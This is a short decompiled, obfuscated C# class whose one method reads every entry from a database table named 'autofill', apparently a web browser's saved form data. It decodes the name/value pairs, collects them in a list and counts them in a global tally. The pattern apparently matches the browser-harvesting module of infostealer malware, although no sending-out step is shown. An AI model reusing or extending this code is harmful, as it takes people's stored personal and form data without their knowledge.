using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class43
{
	public static List<Struct4> smethod_0(string string_0)
	{
		try
		{
			List<Struct4> list = new List<Struct4>();
			Class57 @class = Class58.smethod_0(string_0, "autofill");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct4 item = default(Struct4);
				item.string_0 = Class46.smethod_2(@class.method_0(i, 0));
				item.string_1 = Class46.smethod_2(@class.method_0(i, 1));
				Class54.int_2++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Struct4>();
		}
	}
}
